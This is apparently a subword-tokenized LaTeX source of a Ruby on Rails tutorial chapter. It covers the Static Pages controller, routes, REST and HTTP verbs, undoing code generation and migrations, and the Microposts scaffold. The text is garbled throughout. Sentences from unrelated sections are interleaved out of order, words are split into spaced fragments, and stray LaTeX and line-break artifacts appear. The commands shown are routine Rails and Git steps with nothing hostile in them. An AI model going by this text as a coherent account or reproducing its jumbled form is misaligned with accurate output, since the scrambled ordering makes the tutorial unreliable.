▁In ▁this ▁section , ▁we ' ll ▁be ▁working ▁main ly ▁in ▁the ▁\ k ode { app / controllers } ▁and ▁\ k ode { app / views } ▁directories .
▁We ▁start ▁with ▁a ▁request ▁issue d ▁from ▁the ▁browser --- i . e . , ▁the ▁result ▁of ▁typing ▁a ▁URL ▁in ▁the ▁address ▁bar ▁or ▁click ing ▁on ▁a ▁link ▁( Step ~ 1 ▁in ▁F igure ~\ ref { fig : mvc _ detailed }).
▁Recall ▁from ▁Section ~\ ref { sec : git _ command s } ▁that , ▁when ▁using ▁Git , ▁it ' s ▁a ▁good ▁practice ▁to ▁do ▁our ▁work ▁on ▁a ▁separate ▁topic ▁branch ▁rather ▁than ▁the ▁master ▁branch .
▁If ▁you ' re ▁using ▁Git ▁for ▁version ▁control , ▁you ▁should ▁run ▁the ▁following ▁command ▁to ▁ checkout ▁a ▁topic ▁branch ▁for ▁static ▁pages :
▁The ▁code ▁to ▁create ▁the ▁mapping ▁of ▁user ▁URLs ▁to ▁controller ▁actions ▁for ▁the ▁Users ▁resource ▁appears ▁in ▁Listing ~\ ref { code : rails _ routes } ; ▁this ▁code ▁effective ly ▁set s ▁up ▁the ▁table ▁of ▁URL / action ▁pair s ▁seen ▁in ▁Table ~\ ref { table : user _ url s }.
▁( The ▁strange ▁notation ▁\ k ode { : users } ▁is ▁a ▁\ emph { symbol }, ▁which ▁we ' ll ▁learn ▁about ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }. )
▁static - pages
▁The ▁Rails ▁routes , ▁with ▁a ▁rule ▁for ▁the ▁Users ▁resource .
▁( The ▁first ▁line ▁here ▁is ▁just ▁to ▁make ▁sure ▁that ▁you ▁start ▁on ▁the ▁master ▁branch , ▁so ▁that ▁the ▁\ k ode { static - pages } ▁topic ▁branch ▁is ▁base d ▁on ▁\ k ode { master }.
▁You ▁can ▁skip ▁that ▁command ▁if ▁you ' re ▁already ▁on ▁the ▁master ▁branch .)
▁Whi le ▁we ' re ▁look ing ▁at ▁the ▁routes ▁file , ▁let ' s ▁take ▁a ▁moment ▁to ▁associate ▁the ▁root ▁route ▁with ▁the ▁users ▁index , ▁so ▁that ▁`` slash '' ▁go es ▁to ▁/ users .
▁Recall ▁from ▁Listing ~\ ref { code : hello _ root _ route } ▁that ▁we ▁changed
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁to ▁generate ▁scaffolding .
▁S ince ▁we ' ll ▁be ▁making ▁a ▁controller ▁to ▁handle ▁static ▁pages , ▁we ' ll ▁call ▁it ▁the ▁Static ▁Pages ▁controller , ▁design at ed ▁by ▁the ▁\ href { https :// en . wiki p edia . org / wiki / CamelCase }{ CamelCase } ▁name ▁\ k ode { StaticPages }.
▁We ' ll ▁also ▁plan ▁to ▁make ▁actions ▁for ▁a ▁Home ▁page , ▁a ▁Help ▁page , ▁and ▁an ▁About ▁page , ▁design at ed ▁by ▁the ▁lower - case ▁action ▁names ▁\ k ode { home }, ▁\ k ode { help }, ▁and ▁\ k ode { about }.
▁so ▁that ▁the ▁root ▁route ▁we n t ▁to ▁the ▁\ k ode { hello } ▁action ▁in ▁the ▁Application ▁controller .
▁The ▁\ k ode { generate } ▁ script ▁take s ▁an ▁optional ▁list ▁of ▁actions , ▁so ▁we ' ll ▁include ▁actions ▁for ▁the ▁Home ▁and ▁Help ▁pages ▁directly ▁on ▁the ▁command ▁line , ▁while ▁in t ent ion ally ▁leav ing ▁off ▁the ▁action ▁for ▁the ▁About ▁page ▁so ▁that ▁we ▁can ▁see ▁how ▁to ▁add ▁it ▁( Section ~\ ref { sec : getting _ started _ with _ test ing }).
▁In ▁the ▁present ▁case , ▁we ▁want ▁to ▁use ▁the ▁\ k ode { index } ▁action ▁in ▁the ▁Users ▁controller , ▁which ▁we ▁can ▁arrange ▁using ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : rails _ routes _ root _ route }.
▁The ▁result ing ▁command ▁to ▁generate ▁the ▁Static ▁Pages ▁controller ▁appears ▁in ▁Listing ~\ ref { code : generating _ pages }.
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁at ▁the ▁beginning ▁of ▁this ▁section .)
▁Generat ing ▁a ▁Static ▁Pages ▁controller .
▁ Adding ▁a ▁root ▁route ▁for ▁users .
▁The ▁pages ▁from ▁the ▁to ur ▁in ▁Section ~\ ref { sec : a _ user _ to ur } ▁correspond ▁to ▁\ emph { action s } ▁in ▁the ▁Users ▁\ emph { controller }, ▁which ▁is ▁a ▁collection ▁of ▁related ▁actions .
▁create ▁app / controllers / static _ pages _ controller . rb
▁The ▁controller ▁generated ▁by ▁the ▁scaffolding ▁is ▁show n ▁schematic ally ▁in ▁Listing ~\ ref { code : demo _ users _ controller }.
▁Note ▁the ▁notation ▁\ k ode { class ▁ UsersController ▁< ▁Application Controller }, ▁which ▁is ▁an ▁example ▁of ▁a ▁Ruby ▁\ emph { class } ▁with ▁\ emph { inheritance }.
▁create ▁app / views / static _ pages
▁( We ' ll ▁discuss ▁inheritance ▁brief ly ▁in ▁Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁cover ▁both ▁subject s ▁in ▁more ▁detail ▁in ▁Section ~\ ref { sec : ruby _ classes }. )
▁create ▁app / views / static _ pages / home . html . erb
▁The ▁Users ▁controller ▁in ▁schematic ▁form .
▁create ▁app / views / static _ pages / help . html . erb
▁create ▁app / helpers / static _ pages _ helper . rb
▁create ▁app / assets / javascripts / static _ pages . js . coffee
▁create ▁app / assets / stylesheets / static _ pages . css . scss
▁For ▁cl ar ity , ▁this ▁tutorial ▁always ▁uses ▁the ▁full ▁command , ▁but ▁in ▁real ▁life ▁most ▁Rails ▁developers ▁use ▁one ▁or ▁more ▁of ▁the ▁shortcut s ▁show n ▁in ▁Table ~\ ref { table : s h or t cut s }.
▁F u ll ▁command
▁ $ ▁rails ▁ s
▁ $ ▁rails ▁c
▁ $ ▁rails ▁g
▁You ▁may ▁notice ▁that ▁there ▁are ▁more ▁actions ▁than ▁there ▁are ▁pages ; ▁the ▁\ k ode { index }, ▁\ k ode { show }, ▁\ k ode { new }, ▁and ▁\ k ode { edit } ▁actions ▁all ▁correspond ▁to ▁pages ▁from ▁Section ~\ ref { sec : a _ user _ to ur }, ▁but ▁there ▁are ▁ additional ▁\ k ode { create }, ▁\ k ode { update }, ▁and ▁\ k ode { destroy } ▁actions ▁as ▁well .
▁These ▁actions ▁don ' t ▁typical ly ▁render ▁pages ▁( a lthough ▁they ▁can ) ; ▁instead , ▁their ▁main ▁purpose ▁is ▁to ▁modify ▁information ▁about ▁users ▁in ▁the ▁database .
▁ $ ▁rake ▁test
▁F i el d ing , ▁R o y ▁Thomas .
▁ $ ▁rake
▁\ emph { A r ch ite c t ur al ▁S t y le s ▁and ▁the ▁De sign ▁of ▁N et work - base d ▁ Software ▁A r ch ite c t ure s }.
▁Some ▁Rails ▁shortcut s .
▁Do c to r al ▁d is s er t ation , ▁Un ivers ity ▁of ▁C al i for n i a , ▁I r v ine , ▁2000 .
▁Before ▁mov ing ▁on , ▁if ▁you ' re ▁using ▁Git ▁it ' s ▁a ▁good ▁idea ▁to ▁add ▁the ▁files ▁for ▁the ▁Static ▁Pages ▁controller ▁to ▁the ▁remote ▁repository :
▁Note ▁from ▁Table ~\ ref { table : demo _ RESTful _ users } ▁that ▁there ▁is ▁some ▁ overlap ▁in ▁the ▁URLs ; ▁for ▁example , ▁both ▁the ▁user ▁\ k ode { show } ▁action ▁and ▁the ▁\ k ode { update } ▁action ▁correspond ▁to ▁the ▁URL ▁/ users /1 .
▁The ▁difference ▁between ▁them ▁is ▁the ▁\ href { http :// en . wiki p edia . org / wiki / HTTP _ request # Request _ methods }{ HTTP ▁request ▁method } ▁they ▁respond ▁to .
▁The ▁final ▁command ▁here ▁arrange s ▁to ▁push ▁the ▁\ k ode { static - pages } ▁topic ▁branch ▁up ▁to ▁Bitbucket .
▁S u b s equ ent ▁push es ▁can ▁omit ▁the ▁other ▁arguments ▁and ▁write ▁simply
▁We ' ll ▁learn ▁more ▁about ▁HTTP ▁request ▁methods ▁starting ▁in ▁Section ~\ ref { sec : getting _ started _ with _ test ing }.
▁The ▁commit ▁and ▁push ▁sequence ▁above ▁represent s ▁the ▁kind ▁of ▁pattern ▁I ▁would ▁or dinarily ▁follow ▁in ▁real - life ▁development , ▁but ▁for ▁simplicity ▁I ' ll ▁typical ly ▁omit ▁such ▁in ter m edia t e ▁commit s ▁from ▁now ▁on .
▁This ▁is ▁me re ly ▁a ▁convention , ▁and ▁in ▁fact ▁using ▁ s n a k e ▁case ▁at ▁the ▁command ▁line ▁also ▁works : ▁the ▁command
▁also ▁generates ▁a ▁controller ▁called ▁\ k ode { static \_ pages \_ controller . rb }.
▁Because ▁Ruby ▁uses ▁ CamelCase ▁for ▁class ▁names ▁( Section ~\ ref { sec : ruby _ classes }), ▁my ▁p reference ▁is ▁to ▁refer ▁to ▁controllers ▁using ▁their ▁ CamelCase ▁names , ▁but ▁this ▁is ▁a ▁matter ▁of ▁taste .
▁( S ince ▁Ruby ▁filename s ▁typical ly ▁use ▁ s n a k e ▁case , ▁the ▁Rails ▁generator ▁convert s ▁ CamelCase ▁to ▁ s n a k e ▁case ▁using ▁the ▁\ href { http :// api . rubyonrails . org / classes / ActiveSupport / In f le c to r . html # method - i - underscore }{\ text tt { underscore } } ▁method .)
▁By ▁the ▁way , ▁if ▁you ▁ever ▁make ▁a ▁mistake ▁when ▁ generating ▁code , ▁it ' s ▁useful ▁to ▁know ▁how ▁to ▁reverse ▁the ▁process .
▁Un do ing ▁things
▁update ▁user ▁with ▁id ▁\ k ode {1}
▁Even ▁when ▁you ' re ▁very ▁careful , ▁things ▁can ▁some times ▁go ▁wrong ▁when ▁developing ▁Rails ▁applications .
▁H appily , ▁Rails ▁has ▁some ▁facilit ies ▁to ▁help ▁you ▁re c over .
▁delete ▁user ▁with ▁id ▁\ k ode {1}
▁One ▁common ▁scenario ▁is ▁want ing ▁to ▁undo ▁code ▁generation --- for ▁example , ▁when ▁you ▁change ▁your ▁mind ▁on ▁the ▁name ▁of ▁a ▁controller ▁and ▁want ▁to ▁eliminate ▁the ▁generated ▁files .
▁RESTful ▁routes ▁provided ▁by ▁the ▁Users ▁resource ▁in ▁Listing ~\ ref { code : rails _ routes }.
▁Because ▁Rails ▁creates ▁a ▁substan tial ▁number ▁of ▁aux i li ary ▁files ▁along ▁with ▁the ▁controller ▁( as ▁seen ▁in ▁Listing ~\ ref { code : generating _ pages }), ▁this ▁is n ' t ▁as ▁easy ▁as ▁remov ing ▁the ▁controller ▁file ▁itself ; ▁undo ing ▁the ▁generation ▁means ▁remov ing ▁not ▁only ▁the ▁principal ▁generated ▁file , ▁but ▁all ▁the ▁an ci ll ary ▁files ▁as ▁well .
▁ RE present ation al ▁ State ▁ Transfer ▁( REST )
▁( In ▁fact , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : demo _ users _ resource } ▁and ▁Section ~\ ref { sec : microposts _ resource }, ▁\ text tt { rails ▁generate } ▁can ▁make ▁automatic ▁edit s ▁to ▁the ▁\ text tt { routes . rb } ▁file , ▁which ▁we ▁also ▁want ▁to ▁undo ▁automatically .)
▁If ▁you ▁read ▁much ▁about ▁Ruby ▁on ▁Rails ▁web ▁development , ▁you ' ll ▁see ▁a ▁lot ▁of ▁reference s ▁to ▁`` REST '' , ▁which ▁is ▁an ▁ acronym ▁for ▁ RE present ation al ▁ State ▁ Transfer .
▁In ▁Rails , ▁this ▁can ▁be ▁accomplish ed ▁with ▁\ text tt { rails ▁destroy } ▁followed ▁by ▁the ▁name ▁of ▁the ▁generated ▁element .
▁REST ▁is ▁an ▁architectur al ▁style ▁for ▁developing ▁d ist r i but ed , ▁network ed ▁systems ▁and ▁software ▁applications ▁such ▁as ▁the ▁World ▁Wi de ▁Web ▁and ▁web ▁applications .
▁In ▁particular , ▁these ▁two ▁commands ▁can ce l ▁each ▁other ▁out :
▁E ar li er ▁versions ▁of ▁Rails ▁used ▁\ text tt { PUT } ▁for ▁data ▁update s , ▁but ▁\ text tt { PATCH } ▁is ▁the ▁more ▁appropriate ▁method ▁according ▁to ▁the ▁HTTP ▁standard .
▁< n > ▁ $ ▁rails ▁generate ▁controller ▁StaticPages ▁home ▁help < n > ▁ $ ▁rails ▁destroy ▁controller ▁StaticPages ▁home ▁help
▁As ▁a ▁Rails ▁application ▁developer , ▁the ▁RESTful ▁style ▁of ▁development ▁help s ▁you ▁make ▁choice s ▁about ▁which ▁controllers ▁and ▁actions ▁to ▁write : ▁you ▁simply ▁structure ▁the ▁application ▁using ▁resources ▁that ▁get ▁created , ▁read , ▁updated , ▁and ▁deleted .
▁Similar ly , ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁we ' ll ▁generate ▁a ▁\ emph { model } ▁as ▁follows :
▁In ▁the ▁case ▁of ▁users ▁and ▁microposts , ▁this ▁process ▁is ▁straightforward , ▁since ▁they ▁are ▁natural ly ▁resources ▁in ▁their ▁own ▁right .
▁In ▁Chapter ~\ ref { cha : following _ users }, ▁we ' ll ▁see ▁an ▁example ▁where ▁REST ▁principle s ▁allow ▁us ▁to ▁model ▁a ▁subtle r ▁problem , ▁`` following ▁users '' , ▁in ▁a ▁natural ▁and ▁convenient ▁way .
▁< n > ▁ $ ▁rails ▁generate ▁model ▁User ▁name : string ▁email : string
▁To ▁examine ▁the ▁relationship ▁between ▁the ▁Users ▁controller ▁and ▁the ▁User ▁model , ▁let ' s ▁focus ▁on ▁a ▁ simplified ▁version ▁of ▁the ▁\ k ode { index } ▁action , ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ action }.
▁( The ▁scaffold ▁code ▁is ▁ugly ▁and ▁confusing , ▁so ▁I ' ve ▁suppress ed ▁it .)
▁This ▁can ▁be ▁undo n e ▁using
▁The ▁ simplified ▁user ▁\ k ode { index } ▁action ▁for ▁the ▁toy ▁application .
▁< n > ▁ $ ▁rails ▁destroy ▁model ▁User
▁( In ▁this ▁case , ▁it ▁turn s ▁out ▁we ▁can ▁omit ▁the ▁other ▁command - line ▁arguments .
▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User . all } ▁( Step ~3 ▁in ▁F igure ~\ ref { fig : mvc _ detailed }), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁the n ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ).
▁The ▁User ▁model ▁itself ▁appears ▁in ▁Listing ~\ ref { code : demo _ user _ model } ; ▁although ▁it ▁is ▁rather ▁plain , ▁it ▁comes ▁equip ped ▁with ▁a ▁large ▁amount ▁of ▁functionality ▁because ▁of ▁inheritance ▁( Section ~\ ref { sec : inheritance _ hierarchies } ▁and ▁Section ~\ ref { sec : ruby _ classes }).
▁When ▁you ▁get ▁to ▁Chapter ~\ ref { cha : modeling _ users }, ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why .)
▁In ▁particular , ▁by ▁using ▁the ▁Rails ▁library ▁called ▁\ emph { Active ▁Record }, ▁the ▁code ▁in ▁Listing ~\ ref { code : demo _ user _ model } ▁arrange s ▁for ▁\ k ode { User . all } ▁to ▁return ▁all ▁the ▁users ▁in ▁the ▁database .
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }.
▁The ▁User ▁model ▁for ▁the ▁toy ▁application .
▁Migrations ▁change ▁the ▁state ▁of ▁the ▁database ▁using ▁the ▁command
▁On ce ▁the ▁\ k ode {@ users } ▁variable ▁is ▁defined , ▁the ▁controller ▁calls ▁the ▁\ emph { view } ▁( Step ~ 6 ), ▁show n ▁in ▁Listing ~\ ref { code : demo _ index _ view }.
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁db : migrate
▁We ▁can ▁undo ▁a ▁single ▁migration ▁step ▁using
▁ V ar i able s
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁db : rollback
▁( Re member , ▁you ▁are n ' t ▁suppose d ▁to ▁understand ▁this ▁code ▁right ▁now .
▁To ▁go ▁all ▁the ▁way ▁back ▁to ▁the ▁beginning , ▁we ▁can ▁use
▁It ▁is ▁show n ▁only ▁for ▁purposes ▁of ▁i ll u str ation .)
▁< n > ▁ $ ▁bundle ▁exec ▁rake ▁db : migrate ▁ V ER S I ON = 0
▁The ▁view ▁for ▁the ▁user ▁index .
▁As ▁you ▁m ight ▁guess , ▁sub st it u ting ▁any ▁other ▁number ▁for ▁\ text tt { 0 } ▁ migrate s ▁to ▁that ▁version ▁number , ▁where ▁the ▁version ▁number s ▁come ▁from ▁list ing ▁the ▁migrations ▁ s equ ent i ally .
▁< table >
▁With ▁these ▁technique s ▁in ▁hand , ▁we ▁are ▁well - equ ip ped ▁to ▁re c over ▁from ▁the ▁in evi table ▁development ▁\ href { http :// en . wiki p edia . org / wiki / M il it ary _ s lang # S N A F U }{ s n a f us }.
▁</ tr >
▁The ▁Static ▁Pages ▁controller ▁generation ▁in ▁Listing ~\ ref { code : generating _ pages } ▁automatically ▁update s ▁the ▁routes ▁file ▁(\ k ode { config / routes . rb }), ▁which ▁we ▁saw ▁brief ly ▁in ▁Section ~\ ref { sec : hello _ world }.
▁The ▁routes ▁file ▁is ▁responsib le ▁for ▁implement ing ▁the ▁route r ▁( see n ▁in ▁F igure ~\ ref { fig : mvc _ detailed }) ▁that ▁defines ▁the ▁correspond ence ▁between ▁URLs ▁and ▁web ▁pages .
▁</ table >
▁The ▁routes ▁file ▁is ▁located ▁in ▁the ▁\ k ode { config } ▁directory , ▁where ▁Rails ▁collect s ▁files ▁needed ▁for ▁the ▁application ▁configuration ▁( F igure ~\ ref { fig : config _ directory _ rails }).
▁The ▁view ▁convert s ▁its ▁contents ▁to ▁HTML ▁( Step ~ 7 ), ▁which ▁is ▁the n ▁returned ▁by ▁the ▁controller ▁to ▁the ▁browser ▁for ▁display ▁( Step ~ 8 ).
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory .
▁T h ough ▁good ▁for ▁getting ▁a ▁general ▁ overview ▁of ▁Rails , ▁the ▁scaffold ▁Users ▁resource ▁ s u ff ers ▁from ▁a ▁number ▁of ▁sever e ▁we a k n es s es .
▁S ince ▁we ▁included ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁the ▁routes ▁file ▁already ▁has ▁a ▁rule ▁for ▁each ▁one , ▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes }.
▁No ▁data ▁validations .
▁The ▁routes ▁for ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁the ▁Static ▁Pages ▁controller .
▁Ou r ▁User ▁model ▁accept s ▁data ▁such ▁as ▁blank ▁names ▁and ▁invalid ▁email ▁addresses ▁without ▁complain t .
▁Here ▁the ▁rule
▁More over , ▁by ▁using ▁\ k ode { get } ▁we ▁arrange ▁for ▁the ▁route ▁to ▁respond ▁to ▁a ▁\ text tt { GET } ▁request , ▁which ▁is ▁one ▁of ▁the ▁f un d a ment al
▁To ▁see ▁the ▁result , ▁start ▁a ▁Rails ▁development ▁server ▁as ▁describe d ▁in ▁Section ~\ ref { sec : rails _ server } :
▁Then ▁navigate ▁to ▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } ▁( F igure ~\ ref { fig : raw _ home _ view }).
▁The ▁raw ▁home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }).
▁\ text tt { GET }, ▁ et ▁c et .
▁The ▁h ypertext ▁transfer ▁protocol ▁(\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol # Request _ methods }{ HTTP }) ▁defines ▁the ▁basic ▁operations ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE }. ▁These ▁refer ▁to ▁operations ▁between ▁a ▁\ emph { client } ▁computer ▁( t ypically ▁running ▁a ▁web ▁browser ▁such ▁as ▁Chrome , ▁Firefox , ▁or ▁Safari ) ▁and ▁a ▁\ emph { server } ▁( t ypically ▁running ▁a ▁web ▁server ▁such ▁as ▁Apache ▁or ▁N g in x ).
▁( It ' s ▁important ▁to ▁understand ▁that , ▁when ▁developing ▁Rails ▁applications ▁on ▁a ▁local ▁computer , ▁the ▁client ▁and ▁server ▁are ▁the ▁same ▁ ph y s ical ▁machine , ▁but ▁in ▁general ▁they ▁are ▁different .)
▁No ▁authentication .
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁frameworks ▁( including ▁Rails ) ▁in f l u ence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁We ▁have ▁no ▁not ion ▁of ▁logging ▁in ▁or ▁out , ▁and ▁no ▁way ▁to ▁prevent ▁any ▁user ▁from ▁perform ing ▁any ▁operation .
▁\ text tt { POST } ▁is ▁the ▁next ▁most ▁common ▁operation ; ▁it ▁is ▁the ▁request ▁sent ▁by ▁your ▁browser ▁when ▁you ▁submit ▁a ▁form .
▁No ▁tests .
▁In ▁Rails ▁applications , ▁\ text tt { POST } ▁requests ▁are ▁typical ly ▁used ▁for ▁\ emph { creating } ▁things ▁( a lthough ▁HTTP ▁also ▁allows ▁\ text tt { POST } ▁to ▁perform ▁update s ).
▁This ▁is n ' t ▁technical ly ▁true --- the ▁scaffolding ▁includes ▁ r udi ment ary ▁tests --- but ▁the ▁generated ▁tests ▁don ' t ▁test ▁for ▁data ▁validation , ▁authentication , ▁or ▁any ▁other ▁custom ▁requirements .
▁No ▁style ▁or ▁layout .
▁For ▁example , ▁the ▁\ text tt { POST } ▁request ▁sent ▁when ▁you ▁submit ▁a ▁re g ist r ation ▁form ▁creates ▁a ▁new ▁user ▁on ▁the ▁remote ▁site .
▁There ▁is ▁no ▁consistent ▁site ▁styling ▁or ▁navigation .
▁The ▁other ▁two ▁verb s , ▁\ text tt { PATCH } ▁and ▁\ text tt { DELETE }, ▁are ▁design ed ▁for ▁\ emph { updating } ▁and ▁\ emph { destroy ing } ▁things ▁on ▁the ▁remote ▁server .
▁No ▁real ▁understanding .
▁These ▁requests ▁are ▁less ▁common ▁than ▁\ text tt { GET } ▁and ▁\ text tt { POST } ▁since ▁browsers ▁are ▁in ca p able ▁of ▁sending ▁them ▁native ly , ▁but ▁some ▁web ▁frameworks ▁( including ▁Ruby ▁on ▁Rails ) ▁have ▁cl ever ▁ways ▁of ▁making ▁it ▁\ emph { see m } ▁like ▁browsers ▁are ▁is s u ing ▁such ▁requests .
▁If ▁you ▁understand ▁the ▁scaffold ▁code , ▁you ▁ probably ▁should n ' t ▁be ▁reading ▁this ▁book .
▁As ▁a ▁result , ▁Rails ▁supports ▁all ▁four ▁of ▁the ▁request ▁types ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE }.
▁< n >\ end { item ize }< n >< n > ▁% ▁subsection ▁we a k n es s es _ of _ the _ users _ resource ▁( end )< n >< n > ▁% ▁section ▁users _ resource ▁( end )< n >< n > ▁\ section { The ▁Microposts ▁resource } ▁% ▁( fold )< n > ▁\ label { sec : microposts _ resource }< n >< n >
▁Having ▁generated ▁and ▁explor ed ▁the ▁Users ▁resource , ▁we ▁turn ▁now ▁to ▁the ▁ associated ▁Microposts ▁resource .
▁To ▁understand ▁where ▁this ▁page ▁comes ▁from , ▁let ' s ▁start ▁by ▁tak ing ▁a ▁look ▁at ▁the ▁Static ▁Pages ▁controller ▁in ▁a ▁text ▁editor , ▁which ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : static _ pages _ controller }.
▁Through out ▁this ▁section , ▁I ▁recommend ▁compar ing ▁the ▁elements ▁of ▁the ▁Microposts ▁resource ▁with ▁the ▁analogous ▁user ▁elements ▁from ▁Section ~\ ref { sec : demo _ users _ resource } ; ▁you ▁should ▁see ▁that ▁the ▁two ▁resources ▁parallel ▁each ▁other ▁in ▁many ▁ways .
▁You ▁may ▁note ▁that , ▁unlike ▁the ▁ demo ▁Users ▁and ▁Microposts ▁controllers ▁from ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁Static ▁Pages ▁controller ▁does ▁not ▁use ▁the ▁standard ▁REST ▁actions .
▁The ▁RESTful ▁structure ▁of ▁Rails ▁applications ▁is ▁best ▁a b so rb ed ▁by ▁this ▁sort ▁of ▁repetition ▁of ▁form --- in de ed , ▁see ing ▁the ▁parallel ▁structure ▁of ▁Users ▁and ▁Microposts ▁even ▁at ▁this ▁ early ▁stage ▁is ▁one ▁of ▁the ▁p r i me ▁ motivation s ▁for ▁this ▁chapter .
▁This ▁is ▁normal ▁for ▁a ▁collection ▁of ▁static ▁pages : ▁the ▁REST ▁architecture ▁is n ' t ▁the ▁best ▁solution ▁to ▁every ▁problem .
▁As ▁with ▁the ▁Users ▁resource , ▁we ' ll ▁generate ▁scaffold ▁code ▁for ▁the ▁Microposts ▁resource ▁using ▁\ k ode { rails ▁generate ▁scaffold }, ▁in ▁this ▁case ▁implement ing ▁the ▁data ▁model ▁from ▁F igure ~\ ref { fig : demo _ micropost _ model }
▁The ▁Static ▁Pages ▁controller ▁made ▁by ▁Listing ~\ ref { code : generating _ pages }.
▁As ▁with ▁the ▁User ▁scaffold , ▁the ▁scaffold ▁generator ▁for ▁microposts ▁follows ▁the ▁singular ▁convention ▁of ▁Rails ▁models ; ▁thus , ▁we ▁have ▁\ k ode { generate ▁Micropost }.
▁ Class es ▁are ▁simply ▁a ▁convenient ▁way ▁to ▁ org an ize ▁\ emph { function s } ▁( also ▁called ▁\ emph { methods }) ▁like ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions , ▁which ▁are ▁defined ▁using ▁the ▁\ k ode { de f } ▁keyword .
▁( We ' ll ▁learn ▁more ▁about ▁both ▁classes ▁and ▁inheritance ▁in ▁Section ~\ ref { sec : ruby _ classes }. )
▁create ▁app / models / micropost . rb
▁In ▁the ▁case ▁of ▁the ▁Static ▁Pages ▁controller , ▁both ▁of ▁its ▁methods ▁are ▁initially ▁empty :
▁In ▁plain ▁Ruby , ▁these ▁methods ▁would ▁simply ▁do ▁nothing .
▁create ▁test / models / micropost _ test . rb
▁In ▁Rails , ▁the ▁situation ▁is ▁different --- \ k ode { StaticPages Controller } ▁is ▁a ▁Ruby ▁class , ▁but ▁because ▁it ▁inherit s ▁from ▁\ k ode { Application Controller } ▁the ▁behavior ▁of ▁its ▁methods ▁is ▁specific ▁to ▁Rails : ▁when ▁visit ing ▁the ▁URL ▁/ static \_ pages / home , ▁Rails ▁look s ▁in ▁the ▁Static ▁Pages ▁controller ▁and ▁execute s ▁the ▁code ▁in ▁the ▁\ k ode { home } ▁action , ▁and ▁the n ▁render s ▁the ▁\ emph { view } ▁( the ▁ V ▁in ▁MVC ▁from ▁Section ~\ ref { sec : mvc }) ▁corresponding ▁to ▁the ▁action .
▁create ▁test / fixtures / microposts . yml
▁So , ▁what ▁does ▁a ▁view ▁look ▁like , ▁and ▁how ▁do ▁we ▁find ▁it ?
▁route ▁resources ▁: microposts
▁We ' ll ▁learn ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages } ▁what ▁the ▁\ k ode { . erb } ▁part ▁means ; ▁from ▁the ▁\ k ode { . html } ▁part ▁you ▁ probably ▁won ' t ▁be ▁surpris ed ▁that ▁it ▁basic ally ▁look s ▁like ▁HTML ▁( Listing ~\ ref { code : raw _ home _ view }).
▁create ▁app / controllers / microposts _ controller . rb
▁The ▁generated ▁view ▁for ▁the ▁Home ▁page .
▁The ▁view ▁for ▁the ▁\ k ode { help } ▁action ▁is ▁analogous ▁( Listing ~\ ref { code : raw _ help _ view }).
▁create ▁app / views / microposts
▁The ▁generated ▁view ▁for ▁the ▁Help ▁page .
▁create ▁app / views / microposts / index . html . erb
▁Bo th ▁of ▁these ▁views ▁are ▁just ▁place h ol d ers : ▁they ▁have ▁a ▁to p - level ▁ head ing ▁( in side ▁the ▁\ k ode { h 1 } ▁tag ) ▁and ▁a ▁ paragraph ▁(\ k ode { p } ▁tag ) ▁with ▁the ▁full ▁path ▁to ▁the ▁corresponding ▁file .
▁create ▁app / views / microposts / edit . html . erb
▁create ▁app / views / microposts / show . html . erb
